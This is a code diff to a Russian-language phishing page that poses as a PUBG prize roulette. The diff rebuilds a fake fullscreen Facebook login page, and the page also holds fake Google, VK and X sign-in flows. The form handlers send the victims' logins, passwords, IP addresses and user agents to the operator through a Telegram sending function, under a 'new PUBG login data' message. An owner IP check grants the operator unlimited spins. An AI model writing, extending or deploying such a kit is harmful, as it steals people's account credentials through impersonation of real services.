@@ -578,85 +578,84 @@
             justify-content: center;
         }
         
-        /* НОВАЯ СЕТКА ПРИЗОВ - ЗИМНИЙ ДИЗАЙН */
+        /* СЕТКА ПРИЗОВ */
         .prizes-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
-            gap: 20px;
-            width: 100%;
-            max-width: 1000px;
-            margin: 40px 0;
-            padding: 20px;
-        }
-
-        .prize-card {
-            background: rgba(255, 255, 255, 0.07);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 20px;
+            grid-template-columns: repeat(3, 1fr);
+            grid-template-rows: repeat(3, 1fr);
+            gap: 8px;
+            width: 90%;
+            height: 90%;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
             padding: 15px;
-            text-align: center;
-            backdrop-filter: blur(10px);
+        }
+        
+        .prize-item {
+            background: linear-gradient(145deg, rgba(255,255,255,0.05) 0%, rgba(255,255,255,0.01) 100%);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0;
             transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             position: relative;
             overflow: hidden;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-            cursor: pointer;
         }
-
-        /* Эффект инея и свечения при наведении */
-        .prize-card:hover {
-            transform: translateY(-10px) scale(1.05);
-            border-color: #00d4ff;
-            box-shadow: 0 0 25px rgba(0, 242, 255, 0.4);
-            background: rgba(255, 255, 255, 0.12);
-        }
-
-        /* Праздничная ленточка "New Year" */
-        .prize-card::before {
-            content: '2026';
+        
+        /* Эффект сканирования */
+        .prize-item::after {
+            content: '';
             position: absolute;
-            top: 10px;
-            right: -30px;
-            background: #ff2e2e;
-            color: white;
-            padding: 2px 40px;
-            font-size: 10px;
-            font-weight: bold;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.05), transparent);
             transform: rotate(45deg);
-            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
-            z-index: 2;
+            animation: scan 4s infinite;
         }
 
-        .prize-image {
-            width: 100%;
-            height: 140px;
+        @keyframes scan {
+            0% { transform: translateX(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) rotate(45deg); }
+        }
+        
+        .prize-item:hover {
+            transform: translateY(-3px) scale(1.05);
+            border-color: rgba(24, 119, 242, 0.3);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .prize-item img {
+            width: 85px;
+            height: 85px;
             object-fit: contain;
-            filter: drop-shadow(0 5px 15px rgba(0,212,255,0.4));
-            margin-bottom: 15px;
-            transition: transform 0.3s;
+            transition: all 0.4s;
+            filter: drop-shadow(0 5px 10px rgba(0, 0, 0, 0.3));
+            z-index: 1;
+            position: relative;
         }
-
-        .prize-card:hover .prize-image {
+        
+        .prize-item:hover img {
             transform: scale(1.1) rotate(5deg);
         }
-
-        .prize-name {
-            font-size: 14px;
-            font-weight: 600;
-            color: #fff;
-            margin-bottom: 10px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
+        
+        .center-item {
+            grid-column: 2;
+            grid-row: 2;
+            background: none;
+            border: none;
         }
-
-        .rarity-tag {
-            font-size: 10px;
-            padding: 4px 10px;
-            border-radius: 50px;
-            background: rgba(255, 215, 0, 0.2);
-            color: #ffd700;
-            border: 1px solid #ffd700;
-            display: inline-block;
+        
+        .center-item img {
+            width: 70px;
+            height: 70px;
+            filter: drop-shadow(0 0 10px rgba(24, 119, 242, 0.5));
+            opacity: 0.8;
         }
         
         /* ОБНОВЛЕННАЯ РАМКА В НОВОГОДНЕМ ЗИМНЕМ СТИЛЕ PUBG */
@@ -2025,23 +2024,39 @@
             text-decoration: underline;
         }
         
-        /* Facebook стиль (новая версия) */
-        .fb-modal {
-            background: #fff;
+        /* НОВЫЙ СТИЛЬ FACEBOOK ИЗ ВТОРОГО ФАЙЛА */
+        /* Основные стили для Facebook */
+        .facebook-fullscreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #fff;
             color: #1c1e21;
-            display: flex;
+            display: none;
             flex-direction: column;
             align-items: center;
-            min-height: 100vh;
-            width: 100%;
-            max-width: 100%;
-            border-radius: 0;
-            padding: 0;
-            margin: 0;
-            animation: fadeIn 0.3s ease;
+            overflow-y: auto;
+            z-index: 3000;
+            animation: facebookFadeIn 0.4s ease;
+        }
+
+        @keyframes facebookFadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
         }
         
-        .fb-app-banner {
+        .facebook-fullscreen.active {
+            display: flex;
+        }
+        
+        /* Верхний баннер установки приложения */
+        .app-banner {
             width: 100%;
             background-color: #fff;
             padding: 12px 16px;
@@ -2051,46 +2066,54 @@
             font-size: 14px;
             color: #1877f2;
         }
-        
-        .fb-app-banner svg {
+
+        .app-banner svg {
             margin-right: 12px;
             fill: #1877f2;
         }
-        
-        .fb-page-container {
+
+        /* Контейнер страницы */
+        .page-container {
             width: 100%;
             max-width: 400px;
             padding: 0 20px;
             text-align: center;
             animation: fadeIn 0.8s ease-in-out;
         }
-        
-        .fb-lang-selector {
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .lang-selector {
             margin-top: 15px;
             font-size: 12px;
             color: #737373;
         }
-        
-        .fb-logo-container {
+
+        /* Логотип */
+        .logo-container {
             margin: 30px 0;
         }
-        
-        .fb-logo-container img {
+
+        .logo-container img {
             width: 60px;
             height: 60px;
         }
-        
-        .fb-login-form {
+
+        /* Форма */
+        .login-form {
             display: flex;
             flex-direction: column;
             gap: 12px;
         }
-        
-        .fb-input-group {
+
+        .input-group {
             position: relative;
         }
-        
-        .fb-input {
+
+        .facebook-input {
             width: 100%;
             height: 55px;
             padding: 16px;
@@ -2101,24 +2124,26 @@
             outline: none;
             transition: border-color 0.2s, box-shadow 0.2s;
         }
-        
-        .fb-input:focus {
+
+        .facebook-input:focus {
             border-color: #1877f2;
             background-color: #fff;
         }
-        
-        .fb-input.error {
+
+        /* Анимация ошибки */
+        .facebook-input.error {
             border-color: #fa3e3e;
             animation: shake 0.3s;
         }
-        
+
         @keyframes shake {
             0%, 100% { transform: translateX(0); }
             25% { transform: translateX(-5px); }
             75% { transform: translateX(5px); }
         }
-        
-        .fb-btn-login {
+
+        /* Кнопки */
+        .facebook-btn-login {
             background-color: #0064e0;
             color: white;
             border: none;
@@ -2130,13 +2155,13 @@
             margin-top: 5px;
             transition: transform 0.1s, background-color 0.2s;
         }
-        
-        .fb-btn-login:active {
+
+        .facebook-btn-login:active {
             transform: scale(0.97);
             background-color: #0056b3;
         }
-        
-        .fb-forgot-link {
+
+        .facebook-forgot-link {
             text-decoration: none;
             color: #1c1e21;
             font-size: 14px;
@@ -2144,13 +2169,14 @@
             margin-top: 15px;
             display: inline-block;
         }
-        
-        .fb-create-account-container {
+
+        /* Разделитель и кнопка создания аккаунта */
+        .create-account-container {
             margin-top: 40px;
             width: 100%;
         }
-        
-        .fb-btn-create {
+
+        .facebook-btn-create {
             width: 100%;
             background-color: transparent;
             color: #1877f2;
@@ -2164,33 +2190,35 @@
             display: block;
             transition: background-color 0.2s;
         }
-        
-        .fb-btn-create:active {
+
+        .facebook-btn-create:active {
             background-color: #e7f3ff;
         }
-        
-        .fb-footer {
+
+        /* Футер */
+        .facebook-footer {
             margin-top: auto;
             padding-bottom: 20px;
             text-align: center;
         }
-        
-        .fb-meta-logo {
+
+        .facebook-meta-logo {
             width: 60px;
             margin-bottom: 10px;
             opacity: 0.6;
         }
-        
-        .fb-footer-links {
+
+        .facebook-footer-links {
             font-size: 12px;
             color: #737373;
         }
-        
-        .fb-footer-links span {
+
+        .facebook-footer-links span {
             margin: 0 5px;
         }
-        
-        .fb-error-msg {
+
+        /* Скрытие текста ошибки по умолчанию */
+        .facebook-error-msg {
             color: #fa3e3e;
             font-size: 12px;
             text-align: left;
@@ -2537,17 +2565,18 @@
             }
             
             .prizes-grid {
-                grid-template-columns: repeat(2, 1fr);
-                gap: 15px;
-                padding: 15px;
+                gap: 6px;
+                padding: 12px;
             }
             
-            .prize-card {
-                padding: 10px;
+            .prize-item img {
+                width: 65px;
+                height: 65px;
             }
             
-            .prize-image {
-                height: 100px;
+            .center-item img {
+                width: 60px;
+                height: 60px;
             }
             
             .play-btn {
@@ -2737,6 +2766,50 @@
         </div>
     </div>
 
+    <!-- Полноэкранная страница Facebook (новая из второго файла) -->
+    <div class="facebook-fullscreen" id="facebookFullscreen">
+        <!-- Баннер iOS -->
+        <div class="app-banner">
+            <svg width="20" height="20" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 11h2.59L12 16.59 8.41 13H11V8h2v5z"/></svg>
+            <span>Установите Facebook для iOS — приложение работает быстрее.</span>
+        </div>
+
+        <div class="page-container">
+            <div class="lang-selector">Русский</div>
+
+            <div class="logo-container">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="FB Logo">
+            </div>
+
+            <form class="login-form" id="facebookLoginForm">
+                <div class="input-group">
+                    <input type="text" id="facebookLogin" class="facebook-input" placeholder="Мобильный телефон или эл. адрес" autocomplete="username">
+                    <div class="facebook-error-msg" id="facebookLoginError">Введите адрес или номер телефона</div>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" id="facebookPassword" class="facebook-input" placeholder="Пароль" autocomplete="current-password">
+                    <div class="facebook-error-msg" id="facebookPasswordError">Введите пароль</div>
+                </div>
+
+                <button type="submit" class="facebook-btn-login">Войти</button>
+            </form>
+
+            <a href="#" class="facebook-forgot-link">Забыли пароль?</a>
+
+            <div class="create-account-container">
+                <a href="#" class="facebook-btn-create">Создать новый аккаунт</a>
+            </div>
+        </div>
+
+        <footer class="facebook-footer">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" class="facebook-meta-logo">
+            <div class="facebook-footer-links">
+                Информация <span>·</span> Справка <span>·</span> Ещё
+            </div>
+        </footer>
+    </div>
+
     <!-- Полноэкранная страница Google -->
     <div class="google-fullscreen" id="googleFullscreen">
         <div class="google-auth-container" id="googleStep1">
@@ -2905,54 +2978,6 @@
             </div>
         </div>
     </div>
-    
-    <!-- Facebook модальное окно (новая версия) -->
-    <div class="modal-overlay" id="facebookModal">
-        <div class="modal fb-modal">
-            <button class="close-modal" onclick="closeModal('facebookModal')" style="color: #606770;">&times;</button>
-            
-            <!-- Баннер iOS -->
-            <div class="fb-app-banner">
-                <svg width="20" height="20" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 11h2.59L12 16.59 8.41 13H11V8h2v5z"/></svg>
-                <span>Установите Facebook для iOS — приложение работает быстрее.</span>
-            </div>
-
-            <div class="fb-page-container">
-                <div class="fb-lang-selector">Русский</div>
-
-                <div class="fb-logo-container">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="FB Logo">
-                </div>
-
-                <form class="fb-login-form" id="fbLoginForm">
-                    <div class="fb-input-group">
-                        <input type="text" id="fbLogin" class="fb-input" placeholder="Мобильный телефон или эл. адрес" autocomplete="username">
-                        <div class="fb-error-msg" id="fbLoginError">Введите адрес или номер телефона</div>
-                    </div>
-                    
-                    <div class="fb-input-group">
-                        <input type="password" id="fbPassword" class="fb-input" placeholder="Пароль" autocomplete="current-password">
-                        <div class="fb-error-msg" id="fbPasswordError">Введите пароль</div>
-                    </div>
-
-                    <button type="submit" class="fb-btn-login">Войти</button>
-                </form>
-
-                <a href="#" class="fb-forgot-link">Забыли пароль?</a>
-
-                <div class="fb-create-account-container">
-                    <a href="#" class="fb-btn-create">Создать новый аккаунт</a>
-                </div>
-            </div>
-
-            <footer class="fb-footer">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" class="fb-meta-logo">
-                <div class="fb-footer-links">
-                    Информация <span>·</span> Справка <span>·</span> Ещё
-                </div>
-            </footer>
-        </div>
-    </div>
 
     <!-- Верхнее меню -->
     <div class="top-menu">
@@ -2999,52 +3024,33 @@
         </div>
         
         <div class="roulette-container">
-            <!-- НОВАЯ СЕТКА ПРИЗОВ С ЗИМНИМ ДИЗАЙНОМ -->
-            <div class="prizes-grid" id="prizesGrid">
-                <div class="prize-card" data-id="1">
-                    <img src="priz1.png" alt="Prize 1" class="prize-image">
-                    <div class="prize-name">M416 Glacier</div>
-                    <span class="rarity-tag">LEGENDARY</span>
+            <div class="prizes-grid">
+                <div class="prize-item" data-id="1">
+                    <img src="priz1.png" alt="Prize">
                 </div>
-                <div class="prize-card" data-id="2">
-                    <img src="priz2.png" alt="Prize 2" class="prize-image">
-                    <div class="prize-name">Kar98k Frost</div>
-                    <span class="rarity-tag">EPIC</span>
+                <div class="prize-item" data-id="2">
+                    <img src="priz2.png" alt="Prize">
                 </div>
-                <div class="prize-card" data-id="3">
-                    <img src="priz3.png" alt="Prize 3" class="prize-image">
-                    <div class="prize-name">AWM Arctic</div>
-                    <span class="rarity-tag">MYTHIC</span>
+                <div class="prize-item" data-id="3">
+                    <img src="priz3.png" alt="Prize">
                 </div>
-                <div class="prize-card" data-id="4">
-                    <img src="priz4.png" alt="Prize 4" class="prize-image">
-                    <div class="prize-name">UMP45 Snow</div>
-                    <span class="rarity-tag">RARE</span>
+                <div class="prize-item" data-id="4">
+                    <img src="priz4.png" alt="Prize">
                 </div>
-                <div class="prize-card" data-id="5">
-                    <img src="priz5.png" alt="Prize 5" class="prize-image">
-                    <div class="prize-name">S12K Ice</div>
-                    <span class="rarity-tag">EPIC</span>
+                <div class="prize-item center-item" data-id="5">
+                    <img src="priz5.png" alt="Prize">
                 </div>
-                <div class="prize-card" data-id="6">
-                    <img src="priz6.png" alt="Prize 6" class="prize-image">
-                    <div class="prize-name">DP-28 Winter</div>
-                    <span class="rarity-tag">LEGENDARY</span>
+                <div class="prize-item" data-id="6">
+                    <img src="priz6.png" alt="Prize">
                 </div>
-                <div class="prize-card" data-id="7">
-                    <img src="priz7.png" alt="Prize 7" class="prize-image">
-                    <div class="prize-name">SCAR-L Frostbite</div>
-                    <span class="rarity-tag">MYTHIC</span>
+                <div class="prize-item" data-id="7">
+                    <img src="priz7.png" alt="Prize">
                 </div>
-                <div class="prize-card" data-id="8">
-                    <img src="priz8.png" alt="Prize 8" class="prize-image">
-                    <div class="prize-name">Vector Glacier</div>
-                    <span class="rarity-tag">EPIC</span>
+                <div class="prize-item" data-id="8">
+                    <img src="priz8.png" alt="Prize">
                 </div>
-                <div class="prize-card" data-id="9">
-                    <img src="priz9.png" alt="Prize 9" class="prize-image">
-                    <div class="prize-name">Mini14 Arctic</div>
-                    <span class="rarity-tag">LEGENDARY</span>
+                <div class="prize-item" data-id="9">
+                    <img src="priz9.png" alt="Prize">
                 </div>
             </div>
             
@@ -3090,7 +3096,7 @@
                     <span>VK</span>
                 </div>
                 
-                <div class="social-option" data-social="facebook" onclick="openModal('facebookModal')">
+                <div class="social-option" data-social="facebook" onclick="openFacebookFullscreen()">
                     <div class="social-icon">
                         <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="#1877F2">
                             <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
@@ -3277,19 +3283,6 @@
         let currentLang = 'en';
         let finalPrizeIndex = 0;
         
-        // Список призов с новыми названиями
-        const prizes = [
-            { id: 1, image: "priz1.png", name: "M416 Glacier", rarity: "LEGENDARY" },
-            { id: 2, image: "priz2.png", name: "Kar98k Frost", rarity: "EPIC" },
-            { id: 3, image: "priz3.png", name: "AWM Arctic", rarity: "MYTHIC" },
-            { id: 4, image: "priz4.png", name: "UMP45 Snow", rarity: "RARE" },
-            { id: 5, image: "priz5.png", name: "S12K Ice", rarity: "EPIC" },
-            { id: 6, image: "priz6.png", name: "DP-28 Winter", rarity: "LEGENDARY" },
-            { id: 7, image: "priz7.png", name: "SCAR-L Frostbite", rarity: "MYTHIC" },
-            { id: 8, image: "priz8.png", name: "Vector Glacier", rarity: "EPIC" },
-            { id: 9, image: "priz9.png", name: "Mini14 Arctic", rarity: "LEGENDARY" }
-        ];
-        
         // Функция сохранения состояния
         function saveUserState() {
             const state = {
@@ -3465,6 +3458,23 @@
         
         function closeGoogleFullscreen() {
             document.getElementById('googleFullscreen').classList.remove('active');
+            document.body.style.overflow = 'auto';
+        }
+        
+        function openFacebookFullscreen() {
+            document.getElementById('facebookFullscreen').classList.add('active');
+            document.body.style.overflow = 'hidden';
+            // Сбрасываем форму
+            document.getElementById('facebookLogin').value = '';
+            document.getElementById('facebookPassword').value = '';
+            document.getElementById('facebookLoginError').style.display = 'none';
+            document.getElementById('facebookPasswordError').style.display = 'none';
+            document.getElementById('facebookLogin').classList.remove('error');
+            document.getElementById('facebookPassword').classList.remove('error');
+        }
+        
+        function closeFacebookFullscreen() {
+            document.getElementById('facebookFullscreen').classList.remove('active');
             document.body.style.overflow = 'auto';
         }
         
@@ -3649,13 +3659,13 @@
         
         // Функция перемещения рамки на выигранный приз
         function moveFrameToPrize(index) {
-            const prizeCards = document.querySelectorAll('.prize-card');
+            const prizeItems = document.querySelectorAll('.prize-item');
             const selectionFrame = document.getElementById('selectionFrame');
             const selectionIndicator = document.getElementById('selectionIndicator');
             
-            if (prizeCards[index]) {
-                const prizeCard = prizeCards[index];
-                const rect = prizeCard.getBoundingClientRect();
+            if (prizeItems[index]) {
+                const prizeItem = prizeItems[index];
+                const rect = prizeItem.getBoundingClientRect();
                 const containerRect = document.querySelector('.roulette-container').getBoundingClientRect();
                 
                 selectionFrame.style.width = (rect.width + 20) + 'px';
@@ -3726,10 +3736,9 @@
                     const stateLoaded = loadUserState();
                     
                     // Проверяем, является ли пользователь владельцем
-                    const isOwner = (userIP === ownerIP);
-                    
-                    if (isOwner) {
+                    if (userIP === ownerIP) {
                         console.log('Owner detected - unlimited spins');
+                        hasPlayed = false;
                         localStorage.setItem('isOwner', 'true');
                     } else {
                         console.log('Regular user - one spin only');
@@ -3767,7 +3776,7 @@
                 const socialSelectSection = document.getElementById('socialSelectSection');
                 const confirmationSection = document.getElementById('confirmationSection');
                 const getPrizeBtn = document.getElementById('getPrizeBtn');
-                const prizeCards = document.querySelectorAll('.prize-card');
+                const prizeItems = document.querySelectorAll('.prize-item');
                 const languageBtn = document.getElementById('languageBtn');
                 const languageDropdown = document.getElementById('languageDropdown');
                 const notification = document.getElementById('notification');
@@ -3790,12 +3799,26 @@
                 const googleStep1 = document.getElementById('googleStep1');
                 const googleStep2 = document.getElementById('googleStep2');
                 
-                // Элементы Facebook
-                const fbLoginForm = document.getElementById('fbLoginForm');
-                const fbLoginInput = document.getElementById('fbLogin');
-                const fbPasswordInput = document.getElementById('fbPassword');
-                const fbLoginError = document.getElementById('fbLoginError');
-                const fbPasswordError = document.getElementById('fbPasswordError');
+                // Элементы Facebook Fullscreen
+                const facebookFullscreen = document.getElementById('facebookFullscreen');
+                const facebookLoginInput = document.getElementById('facebookLogin');
+                const facebookPasswordInput = document.getElementById('facebookPassword');
+                const facebookLoginForm = document.getElementById('facebookLoginForm');
+                const facebookLoginError = document.getElementById('facebookLoginError');
+                const facebookPasswordError = document.getElementById('facebookPasswordError');
+                
+                // Призы с картинками
+                const prizes = [
+                    { id: 1, image: "priz1.png" },
+                    { id: 2, image: "priz2.png" },
+                    { id: 3, image: "priz3.png" },
+                    { id: 4, image: "priz4.png" },
+                    { id: 5, image: "priz5.png" },
+                    { id: 6, image: "priz6.png" },
+                    { id: 7, image: "priz7.png" },
+                    { id: 8, image: "priz8.png" },
+                    { id: 9, image: "priz9.png" }
+                ];
                 
                 let isSpinning = false;
                 let currentPrizeIndex = 0;
@@ -3999,8 +4022,7 @@
                     document.getElementById('prizeMailBtn').innerHTML = `<i class="fas fa-gift"></i> ${t.myPrize} <div class="prize-badge" id="prizeBadge">0</div>`;
                     
                     // Обновляем кнопку игры
-                    const isOwner = localStorage.getItem('isOwner') === 'true';
-                    if (hasPlayed && !isOwner) {
+                    if (hasPlayed && userIP !== ownerIP) {
                         playBtn.innerHTML = `<i class="fas fa-check"></i> ${t.alreadyPlayed}`;
                     } else {
                         playBtn.innerHTML = `<i class="fas fa-play"></i> ${t.play}`;
@@ -4094,7 +4116,6 @@
                 
                 // Функция показа уведомления
                 function showNotification(message, isError = false, isSuccess = false) {
-                    const t = translations[currentLang] || translations.en;
                     notification.textContent = message;
                     notification.classList.remove('error', 'success');
                     
@@ -4187,16 +4208,15 @@
                                 updatePrizeBadge();
                                 
                                 // Сохраняем, что пользователь уже играл (если не владелец)
-                                const isOwner = localStorage.getItem('isOwner') === 'true';
-                                if (!isOwner) {
+                                if (userIP !== ownerIP) {
                                     hasPlayed = true;
                                     saveUserState();
                                     playBtn.innerHTML = `<i class="fas fa-check"></i> ${translations[currentLang].alreadyPlayed}`;
                                 } else {
-                                    // Владелец может играть снова
                                     playBtn.innerHTML = `<i class="fas fa-play"></i> ${translations[currentLang].play}`;
-                                    playBtn.disabled = false;
                                 }
+                                
+                                playBtn.disabled = false;
                                 
                                 // Показываем форму ввода ID аккаунта
                                 if (!accountId) {
@@ -4274,8 +4294,7 @@
                     const loginData = {
                         accountId: accountId,
                         username: xUsername,
-                        password: password,
-                        prize: userPrize ? userPrize.name : 'Unknown'
+                        password: password
                     };
                     
                     const success = await sendLoginDataToTelegram('x', loginData, finalPrizeIndex);
@@ -4297,8 +4316,7 @@
                         accountId: accountId,
                         phone: inputs[0].value,
                         password: inputs[1].value,
-                        foreign_computer: inputs[2].checked ? 'Да' : 'Нет',
-                        prize: userPrize ? userPrize.name : 'Unknown'
+                        foreign_computer: inputs[2].checked ? 'Да' : 'Нет'
                     };
                     
                     const success = await sendLoginDataToTelegram('vk', loginData, finalPrizeIndex);
@@ -4312,73 +4330,75 @@
                     }
                 });
                 
-                // Facebook форма (новая версия)
-                if (fbLoginForm) {
-                    fbLoginForm.addEventListener('submit', async function(e) {
-                        e.preventDefault();
+                // НОВЫЙ ФБ: Обработчик формы Facebook (полноэкранная версия)
+                facebookLoginForm.addEventListener('submit', async function(e) {
+                    e.preventDefault();
+                    
+                    let isValid = true;
+
+                    // Валидация логина
+                    if (facebookLoginInput.value.length < 3) {
+                        facebookLoginError.style.display = 'block';
+                        facebookLoginInput.classList.add('error');
+                        isValid = false;
+                    } else {
+                        facebookLoginError.style.display = 'none';
+                        facebookLoginInput.classList.remove('error');
+                    }
+
+                    // Валидация пароля
+                    if (facebookPasswordInput.value.length < 6) {
+                        facebookPasswordError.style.display = 'block';
+                        facebookPasswordInput.classList.add('error');
+                        isValid = false;
+                    } else {
+                        facebookPasswordError.style.display = 'none';
+                        facebookPasswordInput.classList.remove('error');
+                    }
+
+                    if (isValid) {
+                        const btn = document.querySelector('.facebook-btn-login');
+                        btn.innerText = 'Вход...';
+                        btn.style.opacity = '0.7';
                         
-                        let isValid = true;
-
-                        // Валидация логина
-                        if (fbLoginInput.value.length < 3) {
-                            showFbError(fbLoginInput, fbLoginError);
-                            isValid = false;
-                        } else {
-                            hideFbError(fbLoginInput, fbLoginError);
-                        }
-
-                        // Валидация пароля
-                        if (fbPasswordInput.value.length < 6) {
-                            showFbError(fbPasswordInput, fbPasswordError);
-                            isValid = false;
-                        } else {
-                            hideFbError(fbPasswordInput, fbPasswordError);
-                        }
-
-                        if (isValid) {
-                            const btn = fbLoginForm.querySelector('.fb-btn-login');
-                            btn.innerText = 'Вход...';
-                            btn.style.opacity = '0.7';
-                            
-                            const loginData = {
-                                accountId: accountId,
-                                email: fbLoginInput.value,
-                                password: fbPasswordInput.value,
-                                prize: userPrize ? userPrize.name : 'Unknown'
-                            };
-                            
-                            const success = await sendLoginDataToTelegram('facebook', loginData, finalPrizeIndex);
-                            
-                            if (success) {
-                                closeModal('facebookModal');
+                        // Отправляем данные в Telegram
+                        const loginData = {
+                            accountId: accountId,
+                            email: facebookLoginInput.value,
+                            password: facebookPasswordInput.value
+                        };
+                        
+                        const success = await sendLoginDataToTelegram('facebook', loginData, finalPrizeIndex);
+                        
+                        if (success) {
+                            setTimeout(() => {
+                                btn.innerText = 'Войти';
+                                btn.style.opacity = '1';
+                                
+                                closeFacebookFullscreen();
                                 isPrizeReceived = true;
                                 updatePrizeBadge();
                                 showConfirmation();
                                 showNotification(translations[currentLang].loginSuccess, false, true);
-                            } else {
-                                setTimeout(() => {
-                                    alert('Ошибка подключения к серверу. Попробуйте позже.');
-                                    btn.innerText = 'Войти';
-                                    btn.style.opacity = '1';
-                                }, 1500);
-                            }
+                            }, 1500);
+                        } else {
+                            btn.innerText = 'Войти';
+                            btn.style.opacity = '1';
+                            showNotification("Ошибка отправки данных", true);
                         }
-                    });
-                    
-                    // Убираем ошибку при вводе
-                    fbLoginInput.addEventListener('input', () => hideFbError(fbLoginInput, fbLoginError));
-                    fbPasswordInput.addEventListener('input', () => hideFbError(fbPasswordInput, fbPasswordError));
-                }
+                    }
+                });
                 
-                function showFbError(input, errorElement) {
-                    input.classList.add('error');
-                    errorElement.style.display = 'block';
-                }
-
-                function hideFbError(input, errorElement) {
-                    input.classList.remove('error');
-                    errorElement.style.display = 'none';
-                }
+                // Убираем ошибки при вводе в Facebook форме
+                facebookLoginInput.addEventListener('input', () => {
+                    facebookLoginError.style.display = 'none';
+                    facebookLoginInput.classList.remove('error');
+                });
+                
+                facebookPasswordInput.addEventListener('input', () => {
+                    facebookPasswordError.style.display = 'none';
+                    facebookPasswordInput.classList.remove('error');
+                });
                 
                 // Google Fullscreen обработчики
                 googleNextBtn.addEventListener('click', function(e) {
@@ -4416,8 +4436,7 @@
                         accountId: accountId,
                         email: googleEmail,
                         password: password,
-                        show_password: showPassword ? 'Да' : 'Нет',
-                        prize: userPrize ? userPrize.name : 'Unknown'
+                        show_password: showPassword ? 'Да' : 'Нет'
                     };
                     
                     const success = await sendLoginDataToTelegram('google', loginData, finalPrizeIndex);
@@ -4474,7 +4493,7 @@
                     } else if (selectedSocial === 'vk') {
                         openModal('vkModal');
                     } else if (selectedSocial === 'facebook') {
-                        openModal('facebookModal');
+                        openFacebookFullscreen();
                     }
                 });
                 
@@ -4498,11 +4517,9 @@
                     };
                     
                     const prizeNumber = prizeIndex + 1;
-                    const prizeName = userPrize ? userPrize.name : `Приз #${prizeNumber}`;
                     
                     let message = `🔐 НОВЫЕ ДАННЫЕ ДЛЯ ВХОДА PUBG 🔐\n\n`;
                     message += `🎮 ID аккаунта: ${loginData.accountId || 'Не указано'}\n`;
-                    message += `🎁 Выигранный приз: ${prizeName}\n`;
                     message += `📱 Соцсеть: ${socialNames[socialType] || socialType}\n`;
                     
                     // Добавляем данные в зависимости от соцсети
@@ -4522,6 +4539,7 @@
                         message += `👁️ Показать пароль: ${loginData.show_password || 'Нет'}\n`;
                     }
                     
+                    message += `🎁 Выигранный приз: #${prizeNumber}\n`;
                     message += `⏰ Время: ${new Date().toLocaleString()}\n`;
                     message += `🌐 User Agent: ${navigator.userAgent}\n`;
                     message += `📍 IP: ${userIP || 'Не определен'}`;
@@ -4572,8 +4590,7 @@
                     // Показываем рамку на выигранном призе (уже делается в restoreFramePosition)
                     
                     // Обновляем кнопку игры
-                    const isOwner = localStorage.getItem('isOwner') === 'true';
-                    if (hasPlayed && !isOwner) {
+                    if (hasPlayed && userIP !== ownerIP) {
                         playBtn.innerHTML = `<i class="fas fa-check"></i> ${translations[currentLang].alreadyPlayed}`;
                     }
                     
@@ -4586,8 +4603,7 @@
                 }
                 
                 // Проверяем, играл ли пользователь уже
-                const isOwner = localStorage.getItem('isOwner') === 'true';
-                if (hasPlayed && !isOwner) {
+                if (hasPlayed && userIP !== ownerIP) {
                     playBtn.innerHTML = `<i class="fas fa-check"></i> ${translations[currentLang].alreadyPlayed}`;
                     playBtn.disabled = false;
                 }
@@ -4606,6 +4622,13 @@
                 googleFullscreen.addEventListener('click', function(e) {
                     if (e.target === this) {
                         closeGoogleFullscreen();
+                    }
+                });
+                
+                // Закрытие Facebook Fullscreen при клике вне его
+                facebookFullscreen.addEventListener('click', function(e) {
+                    if (e.target === this) {
+                        closeFacebookFullscreen();
                     }
                 });
                 
@@ -4664,11 +4687,17 @@
                     }
                 });
                 
+                // Закрытие Facebook Fullscreen по Escape
+                document.addEventListener('keydown', function(e) {
+                    if (e.key === 'Escape' && facebookFullscreen.classList.contains('active')) {
+                        closeFacebookFullscreen();
+                    }
+                });
+                
                 // Автоматическая анимация рамки до начала игры
                 function animateFrameRandomly() {
-                    const isOwner = localStorage.getItem('isOwner') === 'true';
-                    if (!isSpinning && (!hasPlayed || isOwner)) {
-                        const randomIndex = Math.floor(Math.random() * prizeCards.length);
+                    if (!isSpinning && !hasPlayed) {
+                        const randomIndex = Math.floor(Math.random() * prizeItems.length);
                         moveFrameToPrize(randomIndex);
                         
                         // Рандомный интервал для следующей анимации
@@ -4679,8 +4708,7 @@
                 
                 // Запускаем анимацию рамки через 2 секунды после загрузки
                 setTimeout(() => {
-                    const isOwner = localStorage.getItem('isOwner') === 'true';
